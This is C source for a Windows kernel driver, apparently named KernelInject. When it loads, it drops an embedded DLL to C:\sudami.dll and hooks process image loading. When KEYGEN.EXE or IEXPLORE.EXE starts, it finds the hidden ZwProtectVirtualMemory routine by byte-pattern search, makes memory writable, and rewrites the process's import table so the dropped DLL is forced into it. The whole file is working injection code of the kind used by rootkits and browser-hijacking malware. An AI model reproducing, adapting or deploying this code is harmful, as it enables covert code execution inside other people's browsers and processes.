///////////////////////////////////////////////////////////////////////////////
///
/// Copyright (c) 2011 - <company name here>
///
/// Original filename: KernelInject.c
/// Project          : KernelInject
/// Date of creation : 2011-05-08
/// Author(s)        : <author name(s)>
///
/// Purpose          : <description>
///
/// Revisions:
///  0000 [2011-05-08] Initial revision.
///
///////////////////////////////////////////////////////////////////////////////

// $Id$

#ifdef __cplusplus
extern "C" {
#endif
#include <ntddk.h>
#include <string.h>
#include <WinDef.h>
#include <ntimage.h>
#include "KernelInject.h"
#include "string.h"
#ifdef __cplusplus
}; // extern "C"
#endif



BOOLEAN G_Sucess=FALSE;
RealZwProtectVirtualMemory ZwProtectVirtualMemory=NULL;

int G_Array[]={0, 1, 3, 4, 5, 8, 9, 0xA, 0xC, -1};

char G_Dllname[]="C:\\sudami.dll";

char G_Dreport[]="Test";

#ifdef __cplusplus
namespace { // anonymous namespace to limit the scope of this global variable!
#endif
PDRIVER_OBJECT pdoGlobalDrvObj = 0;
#ifdef __cplusplus
}; // anonymous namespace
#endif

NTSTATUS KERNELINJECT_DispatchCreateClose(
    IN PDEVICE_OBJECT		DeviceObject,
    IN PIRP					Irp
    )
{
	
    NTSTATUS status = STATUS_SUCCESS;
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}
int checkPattern( unsigned char* pattern1, unsigned char* pattern2, size_t size )   
{   
	register unsigned char* p1 = pattern1;   
	register unsigned char* p2 = pattern2;   
	while( size-- > 0 )   
	{   
		if( *p1++ != *p2++ )   
			return 1;   
	}   
	return 0;   
}
PVOID findUnresolved( PVOID pFunc )   
{   
	UCHAR   pattern[5] = { 0 };   
	PUCHAR  bytePtr = NULL;   
	PULONG  oldStart = 0;   
	ULONG   newStart = 0;   

	memcpy( pattern, pFunc, 5 );   

	// subtract offset   
	oldStart = (PULONG)&(pattern[1]);   
	newStart = *oldStart - 1;   
	*oldStart = newStart;   

	// Search for pattern   
	for( bytePtr = (PUCHAR)pFunc - 5; bytePtr >= (PUCHAR)pFunc - 0x800; bytePtr-- )   
		if( checkPattern( bytePtr, pattern, 5 ) == 0 )   
			return (PVOID)bytePtr;   
	// pattern not found   
	return NULL;   
}
int OffsetEx(ULONG number)
{
	return (number+7) & 0x0FFFFFFF8;
}
ULONG GetSectionoffset(PVOID IMAGE_S_HEADER,ULONG size,PIMAGE_DATA_DIRECTORY DirectoryAddr,ULONG numberbytes)
{
	ULONG VirtualAddr=0;
	PIMAGE_SECTION_HEADER section;
	int offset;
	int Arrabyte,offset_DIRECTORY_Size2;
	ULONG Cmp_VirtualAddr1,Cmp_VirtualAddr2,Cmp_VirtualAddr3;
	ULONG offset_DIRECTORY_Size,offset_DIRECTORY_Size3,i,j;
	ULONG VirtualSize,SizeOfRawData,VirtualAddress;
	ULONG VirtualSize2;

	ULONG DIRECTORY_Size=0;
	VirtualAddr =DirectoryAddr[2].VirtualAddress;
	DIRECTORY_Size=DirectoryAddr[2].Size;
	offset=OffsetEx(numberbytes);

	KdPrint(("GetIatAddressEx\n"));
	if ((VirtualAddr!=0)&&(DIRECTORY_Size!=0))
	{
		offset_DIRECTORY_Size=DIRECTORY_Size / 4096;
		offset_DIRECTORY_Size2=DIRECTORY_Size / 4096 *-4096+DIRECTORY_Size;
		if (!offset_DIRECTORY_Size2) 
		--offset_DIRECTORY_Size;

		if ((4096-offset)>=offset_DIRECTORY_Size2)
		{
			VirtualAddr+=(offset_DIRECTORY_Size *4096 - offset)+4096;
		}
		offset_DIRECTORY_Size3=VirtualAddr+offset-1;
		
		i=0;
		while(TRUE)
		{
			Arrabyte=G_Array[i];
			i++;
			if (Arrabyte ==-1)
			{
				return VirtualAddr;
				
			}
			Cmp_VirtualAddr1=DirectoryAddr[Arrabyte].VirtualAddress;
			Cmp_VirtualAddr2=DirectoryAddr[Arrabyte].Size+Cmp_VirtualAddr1;
			if (Cmp_VirtualAddr1 !=0)
			{
				if (VirtualAddr>=Cmp_VirtualAddr1)
				{
					if (VirtualAddr<=Cmp_VirtualAddr2)
					{
						goto Loop;
					}
					if (offset_DIRECTORY_Size3>=Cmp_VirtualAddr1)
					{
						if (offset_DIRECTORY_Size3<=Cmp_VirtualAddr2)
						{
							goto Loop;
						}
					}
						
				}
			}
		}
	}else
	{
Loop:
		if (size)
		{
			j=0;
			section=IMAGE_S_HEADER;

			do 
			{
				if (!(section->Characteristics & 0x20))
				{

					VirtualSize=section->Misc.VirtualSize;
					SizeOfRawData=section->SizeOfRawData;
					VirtualAddress=section->VirtualAddress;
					if ((VirtualSize!=0) || (SizeOfRawData!=0))
					{
						i=0;
						while(TRUE)
						{
							Arrabyte=G_Array[i];
							i++;
							Cmp_VirtualAddr3=DirectoryAddr[Arrabyte].VirtualAddress;
							if (Cmp_VirtualAddr3)
							{
								if (Cmp_VirtualAddr3>=VirtualAddress)
								{
									if (Cmp_VirtualAddr3<=SizeOfRawData+VirtualAddress)
									{
										break;
									}
								}
							}
							if (Arrabyte ==-1)
								return VirtualAddress;

						}
					}

				}
				j++;
				section++;
			} while (j<size);


			j=0;
			section=IMAGE_S_HEADER;
			do 
			{
				if (!(0x20000000&((section->Characteristics)==0)))
				{
					if (!(0x20&((section->Characteristics)==0)))
					{
						VirtualSize2=section->Misc.VirtualSize;
						VirtualAddress=section->VirtualAddress;
						if (VirtualSize2!=0)
						{
							offset_DIRECTORY_Size2=(VirtualSize2/4096*-4096)+VirtualSize2;
							if (offset_DIRECTORY_Size2)
							{
								if (4096-offset>=offset_DIRECTORY_Size2)
								{
									return ((VirtualSize2/4096+1)*4096)+VirtualAddress-offset;
								}
							}
						}
					}
				}
				j++;
				section++;

			} while (j<numberbytes);
			j=0;
			section=IMAGE_S_HEADER;
			do 
			{
				if ((section->Characteristics&0x20000000))
				{
					if ((section->Characteristics&0x20))
					{
						return section->VirtualAddress;
					}
				}
				j++;
				section++;


			} while (j<numberbytes);

			return 0;
		}else
		{
			return 0;
		}
	}
	
	
}
PWriteMem GetIatAddress(UCHAR singe,PVOID Baseaddr,PVOID IMAGE_S_HEADER,ULONG size,PIMAGE_DATA_DIRECTORY DirectoryAddr,PULONG length,int* size2)

{
	PIMAGE_IMPORT_DESCRIPTOR importDesc,locimportDesc;
	PWriteMem MyWritememory;
	PIMAGE_IMPORT_DESCRIPTOR My_IMAGE_IMPORT_DEC;
	PCHAR dllname;
	PCHAR Realdllname;
	PCHAR Dlltempname;
	ULONG NumberOfBytes;
	char isnuul;
	ULONG dwreturn;
	char name[65]={'0'};
	int i=0;
//第二个是指向输入表的,第一个是指向导出表.
// /*
// 0 Export 1 Import 2 Resources 3 Exception 4 Security 5 Base relocation
// 6 Debug 7 Copyright String 8 Unknow 9 TLS 
// 10 Load Configuration 11 Bound Import
//  12 Import Address Table
//  13 Delay Import
//  14 COM descriptor
// */
	importDesc=(PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)Baseaddr+DirectoryAddr[1].VirtualAddress);
	if (importDesc)
	{	
		ProbeForRead(importDesc,sizeof(IMAGE_IMPORT_DESCRIPTOR),1);//获取个数
		locimportDesc=importDesc;
		if (locimportDesc->Name)
		{
			do 
			{
				if (locimportDesc->FirstThunk==0)
					break;
				if (i>=200) break;
				locimportDesc++;
				i++;
				ProbeForRead(locimportDesc,sizeof(IMAGE_IMPORT_DESCRIPTOR),1);
				

			} while (locimportDesc->Name);
			KdPrint(("iat count:%d\n",i));
			NumberOfBytes=17+i*20+168;
			if (NumberOfBytes>=1000)
			{
				KdPrint(("NumberOfBytes >1000\n"));
				return NULL;
				
			}
			dwreturn=GetSectionoffset(IMAGE_S_HEADER,size,DirectoryAddr,NumberOfBytes);
			if (dwreturn)
			{
				KdPrint(("GetIatAddressEx ok:%.8x \n",dwreturn));
				MyWritememory=(PWriteMem)ExAllocatePoolWithTag(KernelMode,NumberOfBytes,'aus');
				if(MyWritememory)
				{
					
					KdPrint(("get mem ok\n"));
					MyWritememory->IMPORT_mscoree=0;
					MyWritememory->IMPORT_msvcm80=0;
					MyWritememory->IMPORT_msvcm90=0;
					My_IMAGE_IMPORT_DEC=(PIMAGE_IMPORT_DESCRIPTOR)(&MyWritememory->IMPORT_DESCRIPTOR);
					i=1;
					do
					{
						while(TRUE)
						{
							if (!importDesc->Name)
							{
								break;
							}
							dllname=(PCHAR)Baseaddr+importDesc->Name;

							RtlZeroMemory(&name,sizeof(name));
							Dlltempname=&name[0];
							do 
							{
								isnuul=*dllname;
								*Dlltempname=*dllname;
								Dlltempname++;
								dllname++;
							} while (isnuul);
							KdPrint(("is:%s",&name));
							if (!(_stricmp((char*)&name,"mscoree.dll")))
							{
								MyWritememory->IMPORT_mscoree=importDesc;
								importDesc++;
							}else if (!(_stricmp((char*)&name,"msvcm80.dll")))
							{
								MyWritememory->IMPORT_msvcm80=importDesc;
								importDesc++;
							} else if (!(_stricmp((char*)&name,"msvcm90.dll")))
							{
								MyWritememory->IMPORT_msvcm90=importDesc;
								importDesc++;
							}else
							{
								break;
							}
						}
						My_IMAGE_IMPORT_DEC->OriginalFirstThunk=importDesc->OriginalFirstThunk;
						My_IMAGE_IMPORT_DEC->TimeDateStamp=importDesc->TimeDateStamp;
						My_IMAGE_IMPORT_DEC->ForwarderChain=importDesc->ForwarderChain;
						My_IMAGE_IMPORT_DEC->Name=importDesc->Name;
						My_IMAGE_IMPORT_DEC->FirstThunk=importDesc->FirstThunk;
						i++;
						My_IMAGE_IMPORT_DEC++;
						if (!(importDesc->Name))
						{
							break;
						}
						if (!(importDesc->FirstThunk))
						{
							break;
						}
						if (i>=0xc8)
						{
							KdPrint(("Error Iat Count\n"));
							return 0;
						}
						importDesc++;

					}while(TRUE);
				
					dllname=(PCHAR)(&MyWritememory->Viruaddress58h)+i*sizeof(IMAGE_IMPORT_DESCRIPTOR); //在输入表全部填充后的下面写DLL名称
					Realdllname=(PCHAR)(&MyWritememory->Viruaddress58h)+i*sizeof(IMAGE_IMPORT_DESCRIPTOR);
					Dlltempname=(char*)(&G_Dllname);
					do 
					{
						isnuul=*Dlltempname;
						*dllname=*Dlltempname;
						Dlltempname++;
						dllname++;
					} while (isnuul);
					MyWritememory->IMPORT_BY_NAME.Hint=0;
					*((ULONG*)&MyWritememory->IMPORT_BY_NAME.Name)=*(ULONG*)G_Dreport;
					*((UCHAR*)&MyWritememory->IMPORT_BY_NAME.Name+sizeof(ULONG))=*((UCHAR*)G_Dreport+sizeof(ULONG));
					MyWritememory->IMPORT_BY_NAME_offset=(PVOID)(dwreturn+0x44);
				
					MyWritememory->Unknow3=0;
					if (singe)
					{
						MyWritememory->Unknow4=0;
						MyWritememory->Unknow5=0;
					}
					MyWritememory->Viruaddress58h=(PVOID)(dwreturn+0x58);
					MyWritememory->Unknow6=0;
					MyWritememory->Unknow7=0xffffffff;
					MyWritememory->dllnameoffset=(PVOID)(dwreturn+Realdllname-(PCHAR)MyWritememory);
					MyWritememory->Unknow9=(PVOID)(dwreturn+0x58);
					MyWritememory->Unknow[0]=0;
					MyWritememory->Unknow[1]=0;
					MyWritememory->Unknow[2]=0;
					MyWritememory->Unknow[3]=0;
					*((ULONG*)size2)=dwreturn;
					*((ULONG*)size2+1)=0;
					*length=NumberOfBytes;
					return MyWritememory;
					//以上的偏移其实都是根据结构来的,主要是构造输入表，最后把自己的加进来，在填写自己DLL的输入表.
				}

			}

			
		}
	}

	return NULL;


}
NTSTATUS MySetProtectMemory(PVOID buf,ULONG length)
{
	
	PVOID Inubuf;
	ULONG inlength;
	ULONG dwreturn;
	Inubuf=buf;
	inlength=length;
	return ZwProtectVirtualMemory((HANDLE)0xffffffff,&Inubuf,&inlength,PAGE_EXECUTE_READWRITE,&dwreturn);
	
}
VOID ChangePestruc(PVOID Dwbase)
{
	PIMAGE_DOS_HEADER dosherad;
	PWriteMem Mywritemem;
	ULONG Dwlenth;
	ULONG dwreturn;
	ULONG LocalVirtual;
	PIMAGE_NT_HEADERS Ntheard;
	PVOID MywritememS;
	PIMAGE_SECTION_HEADER PSec_Heard;
	UCHAR singe;
	int i;
	ULONG length;
	int size;
	PIMAGE_DATA_DIRECTORY DataDirectory;
	PVOID prebuf;
	ULONG NumberOfRvaAndSizes;
	if (Dwbase!=NULL)
	{
		ProbeForRead(Dwbase, sizeof(IMAGE_DOS_HEADER), 1);
		dosherad=	(PIMAGE_DOS_HEADER)Dwbase;
		if (dosherad->e_magic==IMAGE_DOS_SIGNATURE)//检测PE文件头
		{
			Ntheard=(PIMAGE_NT_HEADERS)((PCHAR)dosherad+dosherad->e_lfanew);//NT文件头
			ProbeForRead(Ntheard, sizeof(IMAGE_NT_HEADERS)+16, 1);
			if (Ntheard->Signature==IMAGE_NT_SIGNATURE)
			{
				if (Ntheard->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR32_MAGIC)
				{
					//偏移到DataDirectory
				
					DataDirectory=&Ntheard->OptionalHeader.DataDirectory[0];				
					NumberOfRvaAndSizes=Ntheard->OptionalHeader.NumberOfRvaAndSizes; //Directory 多少个
					singe=0;
					
				}else
				{
					if (Ntheard->OptionalHeader.Magic==IMAGE_NT_OPTIONAL_HDR64_MAGIC)
					{
						
						DataDirectory=&(((PIMAGE_NT_HEADERS64)Ntheard)->OptionalHeader.DataDirectory[0]);
						NumberOfRvaAndSizes=((PIMAGE_NT_HEADERS64)Ntheard)->OptionalHeader.NumberOfRvaAndSizes;
						singe=1;	
					}else
					{
						NumberOfRvaAndSizes=0;
						DataDirectory=NULL;
					}
				}
				KdPrint(("DataDirectory:%.8x,NumberOfRvaAndSizes:%d\n",(ULONG)DataDirectory,NumberOfRvaAndSizes));
				if ((DataDirectory)&&(NumberOfRvaAndSizes>=0xf))
				{
					KdPrint(("GetIatAddress\n"));
					prebuf=IMAGE_FIRST_SECTION(Ntheard);//，这里是个宏(PVOID)((PCHAR)Ntheard+Ntheard->FileHeader.SizeOfOptionalHeader+24);

					ProbeForRead(prebuf,sizeof(IMAGE_SECTION_HEADER)*Ntheard->FileHeader.NumberOfSections,1);
					Mywritemem=GetIatAddress(singe,Dwbase,prebuf,Ntheard->FileHeader.NumberOfSections,
						DataDirectory,&length,&size);
					if (Mywritemem)
					{
						
						Mywritemem->ExportDataDirectory[0].VirtualAddress=(ULONG)(DataDirectory); //Export symbols
						Mywritemem->ExportDataDirectory[0].Size=0;
						Mywritemem->DataDirectory1_VirtualAddress=DataDirectory[1].VirtualAddress; //Import symbols
						Mywritemem->DataDirectory11_VirtualAddress=DataDirectory[11].VirtualAddress; //Bound Import
						Mywritemem->DataDirectory11_size=DataDirectory[11].Size;
						Mywritemem->DataDirectory12_VirtualAddress=DataDirectory[12].VirtualAddress; //Import Address Table
						Mywritemem->DataDirectory12_size=DataDirectory[12].Size;
						Mywritemem->DataDirectory14_VirtualAddress=DataDirectory[14].VirtualAddress; //COM descriptor
						Mywritemem->DataDirectory14_size=DataDirectory[14].Size;
						MywritememS=(PVOID)((PCHAR)Dwbase+size);
						ProbeForRead(MywritememS,length,1);
						Dwlenth=128;
						
						
						if (NT_SUCCESS(MySetProtectMemory(DataDirectory,Dwlenth)))
						{ 
							
							KdPrint(("Old offset 8 is:%.8x",DataDirectory[1].VirtualAddress));
							DataDirectory[1].VirtualAddress=(ULONG)((PVOID)(size+0x68));
							KdPrint(("offset 8 is:%.8x",(ULONG)((PVOID)(size+0x68))));
							DataDirectory[11].VirtualAddress=0; //Bound Import
							DataDirectory[11].Size=0;
							DataDirectory[14].VirtualAddress=0; //COM descriptor
							DataDirectory[14].Size=0;
							i=0;
							if ((NumberOfRvaAndSizes<=0xc)||(!(DataDirectory[12].VirtualAddress)))
							{
								while(TRUE)
								{
									if (i>=Ntheard->FileHeader.NumberOfSections ) break;
									PSec_Heard=(PIMAGE_SECTION_HEADER)(i*sizeof(IMAGE_SECTION_HEADER)+(PCHAR)(prebuf));
									LocalVirtual=PSec_Heard->VirtualAddress;
									if (Mywritemem->DataDirectory1_VirtualAddress>=LocalVirtual)
									{
										if (Mywritemem->DataDirectory1_VirtualAddress <LocalVirtual+PSec_Heard->SizeOfRawData)
										{
											DataDirectory[12].VirtualAddress=LocalVirtual; //Import Address Table
											if (PSec_Heard->Misc.VirtualSize==0)
											{
												DataDirectory[12].Size=PSec_Heard->SizeOfRawData;
											}else
											{
												DataDirectory[12].Size=PSec_Heard->Misc.VirtualSize;
											}
											break;
										}
										
										
									}
									i++;
												
								}
							}
							
							if (NT_SUCCESS(MySetProtectMemory(MywritememS,length)))
							{
								KdPrint(("New Address:%.8x",(ULONG)MywritememS));
								RtlCopyMemory(MywritememS,Mywritemem,length);

								KdPrint(("Copy Memor Over,dll is loader\n"));
							}else
							{
								KdPrint(("MySetProtectMemory Failed second\n"));
							}
							if (Mywritemem)
							{
								ExFreePoolWithTag(Mywritemem, 0);
							}

						}else
						{
							return;
						}
							
					}else
					{
						KdPrint(("MySetProtectMemory Failed first\n"));
					}
					
					
					
				}
			}
		}
	}

}
VOID NotifyRoutine (IN PUNICODE_STRING Path, IN HANDLE ProcessId, IN PIMAGE_INFO  ImageInfo)
{
	WCHAR ImageName[MAX_PATH];
	NTSTATUS status;
	PROCESS_BASIC_INFORMATION Baseinfo;
	ULONG Dwreturn;
	PMyPEB PebVoid;
	ULONG PEhea;


	if (ProcessId)
	{
		if (ImageInfo->SystemModeImage)
		{
			
		}else
		{
			RtlCopyMemory(&ImageName[0] , Path->Buffer,    Path->MaximumLength );
			_wcsupr((WCHAR*)&ImageName);

			if(( wcsstr((WCHAR*)&ImageName, L"KEYGEN.EXE" ) != NULL)||( wcsstr((WCHAR*)&ImageName, L"IEXPLORE.EXE" ) != NULL))
			{
				KdPrint(("Is My Process:%ws\n",&ImageName));

				status=ZwQueryInformationProcess((HANDLE)0xFFFFFFFF,ProcessBasicInformation,
					&Baseinfo,sizeof(Baseinfo),&Dwreturn);
				if (NT_SUCCESS(status))
				{
					if (Baseinfo.PebBaseAddress)

					{
						PebVoid=(PMyPEB)Baseinfo.PebBaseAddress;
						ProbeForRead(&PebVoid->ImageBaseAddress,sizeof(ULONG),sizeof(ULONG));
						//&PebVoid->ImageBaseAddress取结构程序指针
						//PebVoid->ImageBaseAddress 取值
						if (PebVoid->ImageBaseAddress== ImageInfo->ImageBase)
						{
							ChangePestruc(ImageInfo->ImageBase);
							PEhea=*((ULONG*)(PebVoid->ImageBaseAddress));
							KdPrint(("image:%ws,Value:%8x\n",ImageName,
								PEhea));
						}else
						{
							KdPrint(("PebBaseAddress not equal \n"));
						}

					}else
					{
							KdPrint(("PebBaseAddress is null  \n"));
					}

				}else
				{
					KdPrint(("ZwQueryInformationProcess Faild:%8x\n",status));
				}

			}	
			
		}

	}
	return;
}
int iniNotticefunc()
{
	if (!NotifyRoutinePoint)
	{
			NotifyRoutinePoint=(PLOAD_IMAGE_NOTIFY_ROUTINE)NotifyRoutine;
	}
	return G_Sucess;
}

BOOLEAN GetZwProtectVirtualMemory()
{
	if (ZwProtectVirtualMemory)
	{
		return TRUE;
	}else
	{
		ZwProtectVirtualMemory=(RealZwProtectVirtualMemory)findUnresolved(ZwPulseEvent);
		
		if (ZwProtectVirtualMemory)
		{
			KdPrint(("ZwProtectVirtualMemory:%.8x\n",ZwProtectVirtualMemory));
			return TRUE;
		}else
		{
			KdPrint(("Get ZwProtectVirtualMemory Failed"));
			return FALSE;
		}
	}

}
NTSTATUS WriteFileRes(PCWSTR filename,PVOID buf,ULONG length)
{
	UNICODE_STRING Filename;
	OBJECT_ATTRIBUTES obj;
	HANDLE filehand;
	NTSTATUS status;
	IO_STATUS_BLOCK  IoStatus;
	RtlInitUnicodeString(&Filename,filename);
	InitializeObjectAttributes(&obj,    
		&Filename,   
		OBJ_CASE_INSENSITIVE,    
		NULL,    
		NULL ); 
	status = ZwCreateFile(&filehand,
		FILE_APPEND_DATA,
		&obj,
		&IoStatus,
		0, 
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_WRITE,
		FILE_OPEN_IF,
		FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,     
		0 );
	if (NT_SUCCESS(status))
	{
		status= ZwWriteFile(filehand,
			NULL,
			NULL,
			NULL,
			&IoStatus,
			buf,
			length,
			NULL,
			NULL );
		if (NT_SUCCESS(status))
		{
			ZwClose(filehand);
			return STATUS_SUCCESS;
		}else
		{
			KdPrint(("ZwWriteFile Faild:%.8x",status));
			return	STATUS_UNSUCCESSFUL;
		}


	}else
	{
		KdPrint(("ZwCreateFile Faild:%.8x",status));
		return STATUS_UNSUCCESSFUL;
	}
	
}
BOOLEAN InjdectDll(ULONG Flag)
{
	NTSTATUS status;
	if (Flag==1)
	{
		if (!iniNotticefunc())
		{
			if (GetZwProtectVirtualMemory())
			{
				status=WriteFileRes(L"\\??\\C:\\sudami.dll",&Dllbuf,0x7000);
				if (NT_SUCCESS(status))
				{
					status = PsSetLoadImageNotifyRoutine(NotifyRoutinePoint);
					if (NT_SUCCESS(status))
					{
						G_Sucess=TRUE;
						KdPrint(("PsSetLoadImageNotifyRoutine Set ok"));
					}else
					{
						G_Sucess=FALSE;
						KdPrint(("PsSetLoadImageNotifyRoutine Set Faild"));
					}
				}
			}

		}
	

	}else
	{
		if (iniNotticefunc())
		{
			PsRemoveLoadImageNotifyRoutine(NotifyRoutinePoint);
			G_Sucess=FALSE;
			NotifyRoutinePoint=NULL;
		}
	}
	return G_Sucess;
}

NTSTATUS KERNELINJECT_DispatchDeviceControl(
    IN PDEVICE_OBJECT		DeviceObject,
    IN PIRP					Irp
    )
{
    NTSTATUS status = STATUS_SUCCESS;
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

    switch(irpSp->Parameters.DeviceIoControl.IoControlCode)
    {
	case  0x222000:
		{

			KdPrint(("hello world\n"));
			Irp->IoStatus.Status=0;
			Irp->IoStatus.Information=irpSp->Parameters.DeviceIoControl.OutputBufferLength;
		}
		break;
    default:
        Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
        Irp->IoStatus.Information = 0;
        break;
    }

    status = Irp->IoStatus.Status;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

VOID KERNELINJECT_DriverUnload(
    IN PDRIVER_OBJECT		DriverObject
    )
{
    PDEVICE_OBJECT pdoNextDeviceObj = pdoGlobalDrvObj->DeviceObject;
    IoDeleteSymbolicLink(&usSymlinkName);

    // Delete all the device objects
    while(pdoNextDeviceObj)
    {
        PDEVICE_OBJECT pdoThisDeviceObj = pdoNextDeviceObj;
        pdoNextDeviceObj = pdoThisDeviceObj->NextDevice;
        IoDeleteDevice(pdoThisDeviceObj);
    }
	InjdectDll(0);
}

#ifdef __cplusplus
extern "C" {
#endif
NTSTATUS DriverEntry(
    IN OUT PDRIVER_OBJECT   DriverObject,
    IN PUNICODE_STRING      RegistryPath
    )
{
    PDEVICE_OBJECT pdoDeviceObj = 0;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    pdoGlobalDrvObj = DriverObject;

    // Create the device object.
    if(!NT_SUCCESS(status = IoCreateDevice(
        DriverObject,
        0,
        &usDeviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &pdoDeviceObj
        )))
    {
        // Bail out (implicitly forces the driver to unload).
        return status;
    };

    // Now create the respective symbolic link object
    if(!NT_SUCCESS(status = IoCreateSymbolicLink(
        &usSymlinkName,
        &usDeviceName
        )))
    {
        IoDeleteDevice(pdoDeviceObj);
        return status;
    }

    // NOTE: You need not provide your own implementation for any major function that
    //       you do not want to handle. I have seen code using DDKWizard that left the
    //       *empty* dispatch routines intact. This is not necessary at all!
    DriverObject->MajorFunction[IRP_MJ_CREATE] =
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = KERNELINJECT_DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KERNELINJECT_DispatchDeviceControl;
    DriverObject->DriverUnload = KERNELINJECT_DriverUnload;
	InjdectDll(1);
    return STATUS_SUCCESS;
}
#ifdef __cplusplus
}; // extern "C"
#endif
